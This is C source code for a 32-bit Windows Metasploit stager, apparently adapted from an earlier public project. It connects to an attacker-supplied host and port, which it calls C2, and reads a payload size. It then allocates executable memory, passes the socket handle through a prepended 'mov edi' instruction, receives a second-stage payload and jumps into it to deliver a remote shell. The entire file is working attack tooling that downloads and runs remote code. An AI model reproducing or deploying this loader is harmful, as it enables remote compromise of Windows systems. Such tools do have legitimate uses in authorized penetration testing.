/*Description: 32-bit metasploit loader(stager) compt with metasploit framework.
 receives,loads stage in memory, hand execution to.
*/

// Credists: I borrowed the code from another project which you can find at https://github.com/rsmudge/metasploit-loader, modified and fixed few things to get it to work properly as the original code is no longer functional.



// include needed header files 

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h> 
#include <WinSock2.h>
#include <Windows.h>
#pragma comment (lib,"Ws2_32.lib")


// init use of windows sockets 

void wsock_init(){
    WSADATA WSAData;
    WORD wVersionRequired;
    
    wVersionRequired = MAKEWORD(2,2); 


    if (WSAStartup(wVersionRequired,&WSAData) != 0 ){
        printf("ws2_32.dll is out of data!\n");
        printf("require sockets version:%hu",WSAData.wVersion);
        WSACleanup();
        exit(1);

    }
}

// quick routine to quit and report why we quit
void debug(SOCKET my_sock , char* error){
    printf("Bad things:%s\n",error);
    printf("error code: %d\n",WSAGetLastError());
    closesocket(my_sock);
    WSACleanup();
    exit(1);
}
int32_t recv_all(SOCKET my_socket, char * buffer, int32_t len) {
	int32_t tret = 0;
	int32_t nret = 0;
	intptr_t startb = (intptr_t)buffer;
	while (tret < len) {
		nret = recv(my_socket, (char *)startb, len - tret, 0);
		startb += nret;
		tret += nret;

		if (nret == SOCKET_ERROR)
			debug(my_socket, "Could not receive data");
	}
	return tret; 
}




SOCKET ws_connect(char * target_ip, int port) {
    struct hostent * target;
    SOCKET my_socket ;
    struct sockaddr_in sock ; // sock will maintain target info needed to establish connection 
    /* setup our socket */
    my_socket = socket(AF_INET,SOCK_STREAM,0);

    if (my_socket == INVALID_SOCKET)
        debug(my_socket , "Couldn't initalize socket!");


    /*resolve our target*/
   target =  gethostbyname(target_ip);

   if (!target)
        debug(my_socket , "Couldn't resolve target!");

    /* copy target info into sock*/
    memcpy(&sock.sin_addr,target->h_addr_list[0],target->h_length);
    sock.sin_family = AF_INET;
    sock.sin_port = htons(port); 

    /* attempt to connect */

    int result = connect(my_socket,(struct sockaddr*)&sock,sizeof(sock));
    
    if (result == SOCKET_ERROR) {
        printf("connection to C2 failed with error : %ld\n", WSAGetLastError());
        result = closesocket(my_socket);
        if (result == SOCKET_ERROR)
            printf("closesocket function failed with error: %ld\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }
    return my_socket;

}


int main  (int argc , char** argv){
    
     wsock_init();

    if (argc < 3){
        printf("%s [host] [port]\n",argv[0]);
        exit(1);
    }
    SOCKET my_socket;
    ULONG32 size;  // size of stage payload
    char* buffer = NULL;
    void (*function)();
    char* target_ip = argv[1]; // buffer to hold stage payload
    int port = atoi(argv[2]);

    /* connect to metasploit handler */

    my_socket = ws_connect(target_ip,port); 
    if (my_socket == 1)
        exit(1);
    /*metasploit multi/handler will send a 4-byte value first i.e the stage payload size we need to capture first*/

    /* read 4-byte length of the stage payload*/
    int32_t count = recv(my_socket , (char*)&size,4,0);
    
    /* test if we received the payload length correctly*/
    if (count != 4 || size <=0)
            debug(my_socket,"read an incomplete length value");

    printf("stage size:%d\n",size);
    /*allocate a RWX buffer of size = payload + 5, 5 extra bytes */

   buffer =  (char*)VirtualAlloc(0,size+5 , MEM_COMMIT,PAGE_EXECUTE_READWRITE);

   if (!buffer)
            debug(my_socket,"Couldn't allocate buffer for stage!");

    /* prepend a little assembly to move our SOCKET value to the EDI register
	   thanks mihi for pointing this out
	   BF 78 56 34 12     =>      mov edi, 0x12345678 */
	buffer[0] = 0xBF;

	/* copy the value of our socket to the buffer */
	memcpy(buffer + 1, &my_socket, 4);

    /* read stage into the buffer */
    
    count = recv_all(my_socket, buffer + 5, size);
    if (count == size)
        puts("[+]received stage");
    
    /* cast buffer to function , call to*/
    function = (void (*)())buffer;
    puts("Wait for the shell:)");
	function();


    return EXIT_SUCCESS;
}
